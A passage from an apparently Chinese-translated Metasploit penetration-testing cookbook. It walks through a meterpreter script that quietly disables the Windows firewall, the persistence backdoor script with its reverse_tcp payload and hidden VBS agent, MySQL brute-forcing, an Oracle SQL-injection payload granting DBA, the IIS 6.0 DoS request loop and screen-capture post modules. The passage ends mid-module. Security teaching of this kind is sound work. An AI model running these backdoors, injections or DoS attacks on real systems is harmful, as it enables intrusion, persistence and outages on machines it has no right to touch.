1.  执行此脚本，我们将需要一个 meterpreter 会话。可以使用`run`命令来执行 Ruby 脚本。但是，在使用脚本之前，请确保您在目标机器上拥有系统特权。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > run myscript.rb
[*] disabling the default firewall
meterpreter > 
```

成功执行脚本将悄悄地禁用默认防火墙。命令的执行发生在后台，因此目标用户对此毫不知情。现在让我们详细了解脚本。

## 它是如何工作的...

让我们分析脚本的每个部分。

```
opts = Rex::Parser::Arguments.new(
"-h" => [ false, "Help menu." ]
)
opts.parse(args) { |opt, idx, val|
case opt
when "-h"
print_line "Meterpreter Script for disabling the Default Windows Firewall"
print_line "Let's hope it works"
print_line(opts.usage)
raise Rex::Script::Completed
end
} 
```

这些代码行只是我们可以与脚本一起传递的选项。在此脚本中，我们可以使用的唯一选项是`-h`参数，它显示脚本的使用消息。您可以将此代码片段保存为创建脚本选项的模板。您将遇到几个代码片段，可以直接在您自己的脚本中使用。

脚本从创建一个哈希（opts）开始，其中包括 Rex 库，Rex 库是 Ruby 扩展库的简写。唯一的键是`-h`。使用值设置为'false'，这意味着这是脚本的可选参数。代码的下几行将提供的选项与脚本匹配，并跳转到特定情况以使用`print_line()`显示消息。在我们的情况下，我们只使用了一个选项（`-h`）。

```
unsupported if client.platform !~ /win32|win64/i
begin
print_status("disabling the default firewall")
cmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5)
end 
```

脚本的这部分是操作特定的。它从验证客户端操作系统开始。然后使用 meterpreter mixin `cmd_exec()`，它可以作为隐藏和通道化执行命令。要执行的命令是`netsh advfirewall set AllProfiles state off`。mixin 在客户端机器上调用此命令，与命令提示符一起成功执行，禁用了 Windows 防火墙。

您可以通过添加更多功能并尝试不同的可能性来玩弄脚本。您实验得越多，学到的就越多。

这是如何构建 meterpreter 脚本的简短演示。在下一个配方中，我们将详细了解高级 meterpreter 脚本。

## 还有更多...

让我们扩展我们的讨论，以便更快更有效地进行渗透测试。

### 代码重用

代码重用可以是构建自己脚本的有效技术。您可以找到一些现成的函数，例如创建多处理程序、设置参数检查、添加有效载荷。您可以直接在您的代码中使用它们并利用其功能。请记住，学习 meterpreter 脚本的最佳方法是查看内置脚本。

# 分析现有的 meterpreter 脚本

现在我们已经学会了如何构建自己的脚本，让我们继续分析执行一些高级任务的现有脚本。一旦您能完全阅读现有脚本，您就可以根据需要从中实现函数。代码重用是增加代码优化的有效技术。

## 如何做到这一点...

要查看现有脚本，请浏览到`pentest/exploits/framework3/scripts/meterpreter`。

您可以在此文件夹中找到所有可用的 meterpreter 脚本。我们将分析`persistence.rb`脚本，该脚本有助于在目标用户上设置后门。我们在上一章中已经讨论了此脚本的用法。在这里，我们将深入了解此脚本的功能。

## 它是如何工作的...

让我们逐一分析代码的每个部分。

```
# Default parameters for payload
rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
delay = 5
install = false
autoconn = false
serv = false
altexe = nil
target_dir = nil
payload_type = "windows/meterpreter/reverse_tcp"
script = nil
script_on_target = nil 
```

代码从声明在脚本中使用的变量开始。您可以看到一些常见变量，例如`rhost、rport、payload_type`，我们在整个利用过程中一直在使用。

```
@exec_opts = Rex::Parser::Arguments.new(
"-h" => [ false, "This help menu"],
"-r" => [ true, "The IP of the system running Metasploit listening for the connect back"],
"-p" => [ true, "The port on the remote host where Metasploit is listening"],
"-i" => [ true, "The interval in seconds between each connection attempt"],
"-i" => [ true, "The interval in seconds between each connection attempt"],
"-X" => [ false, "Automatically start the agent when the system boots"],
"-U" => [ false, "Automatically start the agent when the User logs on"],
"-S" => [ false, "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
"-A" => [ false, "Automatically start a matching multi/handler to connect to the agent"],
"-L" => [ true, "Location in target host where to write payload to, if none \%TEMP\% will be used."],
"-T" => [ true, "Alternate executable template to use"],
"-P" => [ true, "Payload to use, default is windows/meterpreter/reverse_tcp."]
)
meter_type = client.platform 
```

脚本的下一部分包括必须与脚本一起传递的不同参数（标志）。具有`true`值的参数是必须的标志，其值必须由渗透测试人员传递。具有`false`值的参数是可选的。

```
# Usage Message Function
#-------------------------------------------------------------------------------
def usage
print_line "Meterpreter Script for creating a persistent backdoor on a target host."
print_line(@exec_opts.usage)
raise Rex::Script::Completed
end
# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
print_error("#{meter} version of Meterpreter is not supported with this Script!")
raise Rex::Script::Completed
end 
```

脚本的下一部分包括函数声明。前两个函数通常在所有 meterpreter 脚本中都可用。使用函数用于显示脚本的介绍性消息。它包含有关脚本用途的简短描述。`wrong_meter_version()`用于验证脚本是否支持 meterpreter 版本。一些脚本不支持较旧的 meterpreter 版本，因此验证可能会有所帮助。

```
# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")
payload = payload_type
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = lhost
pay.datastore['LPORT'] = lport
return pay.generate
end 
```

下一个函数是用于创建有效载荷的。如果您想创建有效载荷（代码重用的力量），则可以直接在您的脚本中使用此函数。函数`create_payload()`接受两个值，即`payload_type`和`lport`。如果您记得变量声明部分，那么这两个变量已经初始化为一些默认值。

`pay = client.framework.payloads.create(payload)`调用允许我们从 Metasploit 框架中创建有效载荷。

在此片段中需要注意的一件事是`pay.datastore['LHOST'] = lhost`和`pay.datastore['LPORT'] = lport`。数据存储区只是一组值的哈希，可能被模块或框架本身用来引用程序员或用户控制的值。

```
# Function for Creating persistent script
#-------------------------------------------------------------------------------
def create_script(delay,altexe,raw)
if altexe
vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay, :template => altexe})
else
vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay})
end
print_status("Persistent agent script is #{vbs.length} bytes long")
return vbs
end 
```

下一个函数是用于创建持久脚本的。脚本是根据传递给脚本的有效载荷和其他参数值创建的。

```
# Function for creating log folder and returning log path
#-------------------------------------------------------------------------------
def log_file(log_path = nil)
#Get hostname
host = @client.sys.config.sysinfo["Computer"]
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
# Create a directory for the logs
if log_path
logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
else
logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
end
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
return logfile
end 
```

下一个函数是用于为脚本创建日志目录的。`host = @client.sys.config.sysinfo["Computer"]`调用提取了受损目标的系统信息。使用负责执行文件和目录操作的 Rex::FileUtils 库创建了目录和文件名。

```
# Function for writing script to target host
#-------------------------------------------------------------------------------
def write_script_to_target(target_dir,vbs)
if target_dir
tempdir = target_dir
else
tempdir = @client.fs.file.expand_path("%TEMP%")
end
tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
fd = @client.fs.file.new(tempvbs, "wb")
fd.write(vbs)
fd.close
print_good("Persistent Script written to #{tempvbs}")
file_local_write(@clean_up_rc, "rm #{tempvbs}\n")
return tempvbs
end 
```

该函数开始将文件写入磁盘。它将各种后门文件保存在之前函数创建的文件夹和目录中。`Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"`调用生成一个随机文本作为要在临时目录中创建的文件名。`fd.write()`调用将文件写入磁盘。

```
# Function for setting multi handler for autocon
#-------------------------------------------------------------------------------
def set_handler(selected_payload,rhost,rport)
print_status("Starting connection handler at port #{rport} for #{selected_payload}")
mul = client.framework.exploits.create("multi/handler")
mul.datastore['WORKSPACE'] = @client.workspace
mul.datastore['PAYLOAD'] = selected_payload
mul.datastore['LHOST'] = rhost
mul.datastore['LPORT'] = rport
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOnSession'] = false
mul.exploit_simple(
'Payload' => mul.datastore['PAYLOAD'],
'RunAsJob' => true
)
print_good("Multi/Handler started!")
end 
```

该函数创建一个多处理程序，以连接回攻击系统。这是一个通用函数，如果您想通过设置多处理程序来实现自动连接功能，可以在您的脚本中使用它。

```
# Function to execute script on target and return the PID of the process
#-------------------------------------------------------------------------------
def targets_exec(script_on_target)
print_status("Executing script #{script_on_target}")
proc = session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
print_good("Agent executed with PID #{proc.pid}")
file_local_write(@clean_up_rc, "kill #{proc.pid}\n")
return proc.pid
end 
```

该函数负责在目标机器上执行脚本。持久性脚本在目标机器上创建 vbs 脚本，因此必须执行它们以打开连接。`Targets_exec()`函数解决了这个目的。如果您想在目标机器上执行脚本，这个函数可以再次作为通用函数在您自己的脚本中使用。`session.sys.process.execute()`调用负责执行脚本，`proc.pid`返回创建的后门进程的进程 ID。

代码的其余部分是不言自明的，这些函数被调用，一个清晰的脚本被创建，并且一个选项检查被实施。这个示例可能让您清楚地了解当我们执行一个 meterpreter 脚本时背后发生了什么。从渗透测试人员的角度来看，能够根据工作场景阅读和修改代码非常重要。这就是开源框架的美妙之处所在。您可以根据自己的需求进行修改，并通过直接分析现有的源代码来学习。


# 第七章：使用渗透测试模块

在本章中，我们将涵盖：

+   使用扫描器辅助模块

+   使用辅助管理员模块

+   SQL 注入和 DOS 攻击模块

+   后渗透模块

+   了解模块构建的基础知识

+   分析现有模块

+   构建您自己的后渗透模块

# 介绍

在我们讨论 Metasploit 框架基础知识的第一章中，我们提到它具有模块化架构。这意味着所有的利用、有效载荷、编码器等都以模块的形式存在。模块化架构使得扩展框架的功能变得更加容易。任何程序员都可以开发自己的模块，并将其轻松地移植到框架中。完整的渗透测试过程可以包括多个模块的操作。例如，我们从一个利用模块开始，然后使用有效载荷模块，一旦目标被攻破，我们可以使用多个后渗透模块。最后，我们还可以使用不同的模块连接到数据库并存储我们的发现和结果。尽管在使用 Metasploit 时很少谈到模块，但它们构成了框架的核心，因此有必要对其有深入的了解。

在本章中，我们将特别关注`pentest/exploits/framework3/modules`目录，其中包含一整套有用的模块，可以简化我们的渗透测试任务。模块的使用方式与我们迄今为止所做的非常相似，但功能上有一些差异。在本章的后面，我们还将分析一些现有的模块，并最终通过学习如何为 Metasploit 开发自己的模块来结束本章。让我们开始使用模块进行实验。

# 使用扫描器辅助模块

让我们开始使用扫描器模块进行实验。我们已经详细了解了使用 Nmap 进行扫描。在这个示例中，我们将分析一些随框架提供的现成扫描模块。尽管 Nmap 是一个强大的扫描工具，但仍然可能出现需要执行特定类型的扫描的情况，例如扫描 MySQL 数据库的存在。

Metasploit 为我们提供了一个完整的有用扫描器列表。让我们继续实际实施其中一些。

## 准备工作

要找到可用扫描器的列表，我们需要浏览到`/pentest/exploits/framework3/modules/auxiliary/scanner`。

您可以找到一组超过 35 个有用的扫描模块，可在各种渗透测试场景下使用。

## 如何做...

让我们从基本的 HTTP 扫描器开始。您会发现有许多不同的 HTTP 扫描选项可用。我们将在这里讨论其中一些。

考虑`dir_scanner`脚本。这将扫描单个主机或完整的网络范围，以寻找可以进一步探索以收集信息的有趣目录列表。

要开始使用辅助模块，我们需要在 msfconsole 中执行以下步骤：

```
msf > use auxiliary/scanner/http/dir_scanner
msf auxiliary(dir_scanner) > show options
Module options: 
```

`show options`命令将列出您可以与扫描器模块一起传递的所有可选参数。最重要的是`RHOSTS`参数，它将帮助我们定位网络中的单台计算机或一系列计算机。

## 它是如何工作的...

让我们讨论涉及一些额外输入的特定扫描器模块。`mysql_login`扫描器模块是一个暴力模块，它扫描目标上 MySQL 服务器的可用性，并尝试通过暴力攻击登录到数据库：

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > show options
Module options (auxiliary/scanner/mysql/mysql_login):
Name Current Setting Required Description
---- --------------- -------- -----------
BLANK_PASSWORDS true yes Try blank pas..
BRUTEFORCE_SPEED 5 yes How fast to..
PASSWORD no A specific password
PASS_FILE no File containing..
RHOSTS yes The target address.
RPORT 3306 yes The target port..
STOP_ON_SUCCESS false yes Stop guessing...
THREADS 1 yes The number of..
USERNAME no A specific user..
USERPASS_FILE no File containing..
USER_FILE no File containing..
VERBOSE true yes Whether to print.. 
```

正如您所看到的，我们可以传递许多不同的参数给这个模块。我们充分利用模块的功能，我们成功进行渗透测试的机会就越大。我们可以提供一个完整的用户名和密码列表，模块可以使用并尝试在目标机器上使用。

让我们向模块提供这些信息：

```
msf auxiliary(mysql_login) > set USER_FILE /users.txt
USER_FILE => /users.txt
msf auxiliary(mysql_login) > set PASS_FILE /pass.txt
PASS_FILE => /pass.txt 
```

现在我们准备使用暴力破解。最后一步将是选择目标并提供运行命令以执行该模块：

```
msf auxiliary(mysql_login) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf auxiliary(mysql_login) > run
[*] 192.168.56.101:3306 - Found remote MySQL version 5.0.51a
[*] 192.168.56.101:3306 Trying username:'administrator' with password:'' 
```

输出显示，该模块首先查找目标上是否存在 MySQL 服务器来启动进程。一旦找到，它就开始尝试使用外部文本文件中提供的用户名和密码组合。这也是当前情况下 Metasploit 最广泛使用的模块操作之一。已经开发了许多自动化暴力破解模块来破解弱密码。

## 还有更多...

让我们通过 Metasploit 快速简单地生成密码文件的方法。在暴力渗透测试期间，拥有一个体面的密码文件列表可能会有所帮助。

### 使用"Crunch"生成密码

对于任何暴力破解攻击，我们都必须拥有一个可观的密码文件列表，这些列表将在此类攻击中使用。密码列表可以从在线资源获取，或者渗透测试人员可以选择使用 John The Ripper 生成密码列表。或者，也可以使用 Backtrack 的"crunch"实用程序基于正在使用的字符生成此类列表。您可以在`/pentest/passwords/crunch`中找到"crunch"实用程序。如果在您的 Backtrack 版本中缺少它，则可以通过在终端窗口中传递以下命令来安装它：

```
root@bt: cd /pentest/passwords
root@bt:/pentest/passwords# apt-get install crunch 
```

crunch 的基本语法如下：

```
./ crunch <min-len> <max-len> [-f /path/to/charset.lst charset-name] [-o wordlist.txt]
[-t [FIXED]@@@@] [-s startblock] [-c number]

```

让我们了解一些 crunch 实用程序的有用参数的功能：

+   `min-len:` 起始的最小长度字符串

+   `max-len:` 结束的最大长度字符串

+   `charset:` 定义要使用的字符集

+   `-b:` 数量[类型：kb/mb/gb] - 它指定输出文件的大小

+   `-f </path/to/charset.lst> <charset-name>:` 允许我们从`charset.lst`中指定字符集

+   `-o <wordlist.txt>:` 定义要保存输出的文件

+   `-t <@*%^>:` 用于添加那些肯定会出现在密码中的文本

可以在以下网址找到有关 crunch 实用程序的完整文档：

[`sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/`](http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/)

您可以阅读完整的文档，以找出如何使用此实用程序生成长且复杂的密码列表。

# 使用辅助管理模块

继续进行我们的模块实验，我们将了解一些在渗透测试期间非常有用的管理模块。管理模块可以用于不同的目的，例如可以查找管理面板，或者可以尝试进行管理登录等。这取决于模块的功能。在这里，我们将看一下一个名为`mysql_enum`模块的简单管理辅助模块。

## 准备工作

`mysql_enum`模块是 MySQL 数据库服务器的特殊实用程序模块。只要提供了适当的凭据以远程连接，该模块就可以对 MySQL 数据库服务器进行简单枚举。让我们通过使用该模块详细了解它。

## 如何做...

我们将从启动 msfconsole 并提供辅助模块的路径开始：

```
msf > use auxiliary/admin/mysql/mysql_enum
msf auxiliary(mysql_enum) > show options
Module options (auxiliary/admin/mysql/mysql_enum):
Name Current Setting Required Description
---- --------------- -------- -----------
PASSWORD no The password for the..
RHOST yes The target address
RPORT 3306 yes The target port
USERNAME no The username to.. 
```

如您所见，该模块接受密码、用户名和 RHOST 作为参数。这可以帮助模块首先搜索 MySQL 数据库的存在，然后应用凭据尝试远程登录。让我们分析`exploit`命令的输出：

```
msf auxiliary(mysql_enum) > exploit
[*] Configuration Parameters: 
[*] C2 Audit Mode is Not Enabled 
[*] xp_cmdshell is Enabled 
[*] remote access is Enabled 
[*] allow updates is Not Enabled 
[*] Database Mail XPs is Not Enabled 
[*] Ole Automation Procedures are Not Enabled 
[*] Databases on the server: 
[*] Database name:master 
```

该模块返回了大量有用的信息。它告诉我们在目标 MySQL 设置上已启用了`cmdshell`和远程访问。它还返回了目标机器上当前正在处理的数据库名称。

对于其他服务（如 MSSQL 和 Apache），也有几个类似的模块可用。大多数模块的工作过程都是类似的。请记住使用 show options 命令，以确保您传递了模块所需的参数。

## 它是如何工作的...

这些辅助管理模块通过简单的枚举过程运行，通过建立连接然后传递用户名和密码组合。它还可以用于检查数据库服务器是否支持匿名登录。我们还可以测试默认用户名和密码，就像 MySQL 使用“scott”和“tiger”作为默认登录凭据一样。

# SQL 注入和 DOS 攻击模块

Metasploit 对渗透测试人员和黑客都很友好。原因是渗透测试人员必须从黑客的角度思考，以确保他们的网络、服务、应用程序等安全。SQL 注入和 DOS 模块帮助渗透测试人员攻击自己的服务，以确定它们是否容易受到此类攻击。因此，让我们详细讨论一些这些模块。

## 准备工作

SQL 注入模块利用数据库类型中已知的漏洞并提供未经授权的访问。这个漏洞已知会影响 Oracle 9i 和 10g。Metasploit 包含几个模块，这些模块利用 Oracle 数据库中已知的漏洞来进行查询注入。这些模块可以在`modules/auxiliary/sqli/oracle`中找到。

## 如何操作...

让我们分析一个名为**Oracle DBMS_METADATA XML**的 Oracle 漏洞。这个漏洞将把权限从`DB_USER`提升到`DB_ADMINISTRATOR`（数据库管理员）。我们将使用`dbms_metadata_get_xml`模块：

```
msf auxiliary(dbms_metadata_get_xml) > show options
Module options (auxiliary/sqli/oracle/dbms_metadata_get_xml):
Name Current Setting Required Description
---- --------------- -------- -----------
DBPASS TIGER yes The password to..
DBUSER SCOTT yes The username to..
RHOST yes The Oracle host.
RPORT 1521 yes The TNS port.
SID ORCL yes The sid to authenticate.
SQL GRANT DBA to SCOTT no SQL to execute. 
```

该模块请求类似我们迄今为止见过的参数。数据库首先通过使用默认登录凭据，即“scott”和“tiger”作为默认用户名和密码来检查登录。一旦模块以数据库用户身份登录，它就会执行利用程序以提升权限到数据库管理员。让我们在目标上执行模块作为测试运行。

```
msf auxiliary(dbms_metadata_get_xml) > set RHOST 192.168.56.1
msf auxiliary(dbms_metadata_get_xml) > set SQL YES
msf auxiliary(dbms_metadata_get_xml) > run 
```

模块成功执行后，用户权限将从`DB_USER`提升到`DB_ADMINISTRATOR`。

我们将要介绍的下一个模块与**拒绝服务（DOS）**攻击有关。我们将分析一个简单的 IIS 6.0 漏洞，允许攻击者通过发送包含超过 40000 个请求参数的 POST 请求来使服务器崩溃。我们将很快分析这个漏洞。该模块已在运行 IIS 6.0 的未打补丁的 Windows 2003 服务器上进行了测试。我们将使用的模块是`ms10_065_ii6_asp_dos:`

```
msf > use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
msf auxiliary(ms10_065_ii6_asp_dos) > show options
Module options (auxiliary/dos/windows/http/ms10_065_ii6_asp_dos):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 80 yes The target port
URI /page.asp yes URI to request
VHOST no The virtual host name to..
msf auxiliary(ms10_065_ii6_asp_dos) > set RHOST 192.168.56.1
RHOST => 192.168.56.1
msf auxiliary(ms10_065_ii6_asp_dos) > run
[*] Attacking http://192.168.56.1:80/page.asp 
```

一旦使用 run 命令执行模块，它将通过在端口 80 上发送 HTTP 请求，以 URI 为 page.asp 来攻击目标 IIS 服务器。模块的成功执行将导致 IIS 服务器完全拒绝服务。

## 它是如何工作的...

让我们快速看一下这两个漏洞。通过注入一个自定义的 PL/SQL 函数来利用 Oracle 数据库漏洞，该函数在 SYS 上下文中执行，并将用户“scott”的权限提升为管理员。

考虑以下示例函数：

```
CREATE OR REPLACE FUNCTION "SCOTT"."ATTACK_FUNC" return varchar2 authid current_user as pragma autonomous_transaction; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT'; COMMIT; RETURN ''; END; /

```

现在将此函数注入到易受攻击的过程中将导致用户 scott 的权限提升。

```
SELECT SYS.DBMS_METADATA.GET_DDL('''||SCOTT.ATTACK_FUNC()||''','') FROM dual;

```

上述代码行解释了注入过程。对 Oracle 软件中漏洞的详细分析超出了本书的范围。

现在移动 DOS 攻击模块，它利用 IIS 6.0 服务器中的漏洞。攻击者发送一个包含超过 40000 个请求参数的 POST 请求，并以`application/x-www-form-urlencoded`编码类型发送。

以下是服务模块的一部分脚本：

```
while(1)
begin
connect
payload = "C=A&" * 40000
length = payload.size
sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
sploit << "Connection:Close\r\n"
sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
sploit << "Content-Length:#{length} \r\n\r\n"
sploit << payload
sock.put(sploit)
#print_status("DoS packet sent.")
disconnect
rescue Errno::ECONNRESET
next
end
end 
```

如您所见，脚本生成了超过 40000 的有效负载大小。然后，在端口 80 上建立连接，向 IIS 服务器发送 HTTP 请求。一旦服务器渲染了请求，它将崩溃并停止工作，除非重新启动。

# 后期利用模块

到目前为止，我们已经在后渗透阶段使用了 meterpreter 的各种功能。然而，我们还有一个单独的专用模块列表，可以增强我们的渗透测试体验。由于它们是后渗透模块，我们将需要与目标建立一个活动会话。我们可以使用前几章描述的任何方法来访问我们的目标。

## 准备工作

后模块是一组最有趣和方便的功能的集合，您可以在渗透测试中使用。让我们快速分析其中一些。在这里，我们使用一个未打补丁的 Windows 7 机器作为我们的目标，并且有一个活动的 meterpreter 会话。

## 如何做...

您可以在`modules/post/windows/gather`中找到后模块。让我们从一个简单的`enum_logged_on_users`模块开始。这个后模块将列出 Windows 机器中当前登录的用户。

我们将通过我们的活动 meterpreter 会话执行模块。还要记住使用`getsystem`命令提升权限，以避免在执行模块时出现任何错误。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > run post/windows/gather/enum_logged_on_users
[*] Running against session 1
Current Logged Users
====================
SID User
--- ----
S-1-5-21-2350281388-457184790-407941598 DARKLORD-PC\DARKLORD
Recently Logged Users
=====================
SID Profile Path
--- ------------
S-1-5-18 %systemroot%\system32\config\systemprofile
S-1-5-19 C:\Windows\ServiceProfiles\LocalService
S-1-5-20 C:\Windows\ServiceProfiles\NetworkService
S-1-5-21-23502 C:\Users\DARKLORD
S-1-5-21-235 C:\Users\Winuser 
```

模块的成功执行向我们展示了两个表。第一个表反映了当前登录的用户，第二个表反映了最近登录的用户。在执行模块时，请遵循正确的路径。我们使用`run`命令来执行模块，因为它们都是以 Ruby 脚本的形式存在，所以 meterpreter 可以轻松识别它。

让我们再举一个例子。有一个有趣的后模块可以捕获目标桌面的截图。当我们需要知道是否有任何活动用户时，这个模块就会很有用。我们将使用的模块是`screen_spy.rb:`

```
meterpreter > run post/windows/gather/screen_spy
[*] Migrating to explorer.exe pid: 1104
[*] Migration successful
[*] Capturing 60 screenshots with a delay of 5 seconds 
```

您可能已经注意到后模块可以是多么简单和有用。在未来，Metasploit 的开发人员将更多地专注于后模块，而不是 meterpreter，因为它极大地增强了渗透测试的功能。因此，如果您希望为 Metasploit 社区做出贡献，那么您可以致力于后模块。

## 工作原理...

我们可以在`modules/post/windows/gather`中分析`enum_logged_on_user.rb`和`screen_spy.rb`的脚本。这可以帮助我们了解这些模块的功能。

# 理解模块构建的基础知识

到目前为止，我们已经看到了模块的效用以及它们可以为框架增加的功能。为了掌握框架，了解模块的工作和构建是至关重要的。这将帮助我们根据我们的需求快速扩展框架。在接下来的几个示例中，我们将看到如何使用 Ruby 脚本构建我们自己的模块并将其导入框架。

## 准备工作

要开始构建我们自己的模块，我们需要基本的 Ruby 脚本知识。我们已经讨论了在 meterpreter 脚本中使用和实现 Ruby。在这个示例中，我们将看到如何使用 Ruby 来开始为框架构建模块。这个过程与 meterpreter 脚本非常相似。不同之处在于使用一组预定义的行，这些行将需要以使框架了解模块的要求和性质。因此，让我们讨论一些模块构建的基本要求。

## 如何做...

框架中的每个模块都以 Ruby 脚本的形式存在，并位于模块目录中。根据我们的需求，我们将不得不导入一些框架库。让我们继续前进，看看我们如何在脚本中导入库并设计一个完全功能的模块。

## 工作原理...

让我们从模块构建的一些基础知识开始。为了使我们的模块对框架可读，我们将不得不导入 MSF 库：

```
require 'msf/core'

```

这是每个脚本的首要行。这一行表示该模块将包括 Metasploit 框架的所有依赖项和功能。

```
class Metasploit3 < Msf::Auxiliary

```

这行定义了一个类，该类继承了辅助家族的属性。辅助模块可以导入多种功能，如扫描、建立连接、使用数据库等：

```
include Msf::

```

`include`语句可用于将框架的特定功能包含到我们自己的模块中。例如，如果我们正在构建一个扫描器模块，那么我们可以将其包含为：

```
include Msf::Exploit::Remote::TCP

```

这行将在模块中包含远程 TCP 扫描的功能。这行将从 Metasploit 库中提取主要扫描模块库：

```
def initialize
super(
'Name' => 'TCP Port Scanner',
'Version' => '$Revision$',
'Description' => 'Enumerate open TCP services',
'Author' => [ darklord ],
'License' => MSF_LICENSE
)

```

脚本的下几行向我们介绍了模块的名称、版本、作者、描述等：

```
register_options(
[
OptString.new('PORTS', [true, "Ports to scan (e.g. 25,80,110-900)", "1-10000"]),
OptInt.new('TIMEOUT', [true, "The socket connect timeout in milliseconds", 1000]),
OptInt.new('CONCURRENCY', [true, "The number of concurrent ports to check per host", 10]), self.class)
deregister_options('RPORT')

```

脚本的下几行用于初始化脚本的值。标记为`true`的选项是模块基本所需的选项，而标记为`no`的选项是可选的。这些值可以在执行模块时传递/更改。

这些是您在每个模块中都会找到的一些常见脚本行。分析内置脚本是了解脚本构建的最佳方法。有一些文档可供学习模块构建。学习的最佳方法是掌握 Ruby 脚本编写，并分析现有模块。在下一个示例中，我们将从头开始分析一个完整的模块。

# 分析现有模块

现在我们已经在上一个示例中建立了一些关于模块构建的背景，我们的下一步将是分析现有模块。强烈建议您查看现有模块的脚本，以便更深入地了解模块和平台开发。

## 准备工作

我们将在这里分析一个简单的 ftp 模块，以便更深入地了解模块构建。

我们将从上一个示例中离开的地方继续。我们已经在上一个示例中讨论了模块的基本模板，所以在这里我们将从脚本的主体开始。

## 如何做...

我们将分析 ftp 匿名访问模块。您可以在以下位置找到主要脚本：`pentest/exploits/framework3/modules/auxiliary/scanner/ftp/anonymous.rb`

这是您参考的完整脚本：

```
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Ftp
include Msf::Auxiliary::Scanner
include Msf::Auxiliary::Report
def initialize
super(
'Name' => 'Anonymous FTP Access Detection',
'Version' => '$Revision: 14774 $',
'Description' => 'Detect anonymous (read/write) FTP server access.',
'References' =>
[
['URL', 'http://en.wikipedia.org/wiki/File_Transfer_Protocol#Anonymous_FTP'],
],
'Author' => 'Matteo Cantoni <goony[at]nothink.org>',
'License' => MSF_LICENSE
)
register_options(
[
Opt::RPORT(21),
], self.class)
end
def run_host(target_host)
begin
res = connect_login(true, false)
banner.strip! if banner
dir = Rex::Text.rand_text_alpha(8)
if res
write_check = send_cmd( ['MKD', dir] , true)
if (write_check and write_check =~ /²/)
send_cmd( ['RMD', dir] , true)
print_status("#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})")
access_type = "rw"
else
print_status("#{target_host}:#{rport} Anonymous READ (#{banner})")
access_type = "ro"
end
report_auth_info(
:host => target_host,
:port => rport,
:sname => 'ftp',
:user => datastore['FTPUSER'],
:pass => datastore['FTPPASS'],
:type => "password_#{access_type}",
:active => true
)
end
disconnect
rescue ::Interrupt
raise $!
rescue ::Rex::ConnectionError, ::IOError
end
end
end

```

让我们转到下一节，详细分析脚本。

## 工作原理...

让我们从分析主要脚本主体开始，以了解其工作原理：

```
def run_host(target_host)
begin
res = connect_login(true, false)
banner.strip! if banner
dir = Rex::Text.rand_text_alpha(8)

```

此函数用于开始连接。res 变量保存布尔值 true 或 false。`connect_login`函数是模块用于与远程主机建立连接的特定函数。根据连接的成功或失败，布尔值存储在 res 中。

```
if res
write_check = send_cmd( ['MKD', dir] , true)
if (write_check and write_check =~ /²/)
send_cmd( ['RMD', dir] , true)
print_status("#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})")
access_type = "rw"
else
print_status("#{target_host}:#{rport} Anonymous
access_type="ro"

```

一旦连接建立，模块会尝试检查匿名用户是否具有读/写权限。`write_check`变量检查写操作是否可能。然后检查操作是否成功。根据权限的状态，在屏幕上打印消息。如果写操作失败，则状态将打印为`ro`或`read-only:`

```
report_auth_info(
:host => target_host,
:port => rport,
:sname => 'ftp',
:user => datastore['FTPUSER'],
:pass => datastore['FTPPASS'],
:type => "password_#{access_type}",
:active => true
)
end

```

下一个函数用于报告授权信息。它反映了重要的参数，如主机、端口、用户、密码等。这些是我们使用`show options`命令时出现的值，因此这些值是用户相关的。

这是一个简单演示，演示了一个简单模块在框架内的功能。您可以相应地更改现有脚本以满足您的需求。这使得平台非常适合开发。正如我所说，了解更多关于模块构建的最佳方法是通过分析现有脚本。

在下一个示例中，我们将看到如何构建我们自己的模块并将其传递到框架中。

# 构建您自己的后渗透模块

现在我们已经涵盖了足够的关于构建模块的背景知识。在这里，我们将看到一个示例，说明我们如何构建自己的模块并将其添加到框架中。构建模块非常方便，因为它们将使我们有能力根据我们的需求扩展框架。

## 如何做...

让我们构建一个小的后渗透模块，该模块将枚举目标计算机上安装的所有应用程序。由于这是一个后渗透模块，我们需要一个受损的目标才能执行该模块。

要开始构建模块，我们将首先导入框架库并包含所需的依赖项：

```
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
class Metasploit3 < Msf::Post
include Msf::Post::Windows::Registry
def initialize(info={})
super( update_info( info,
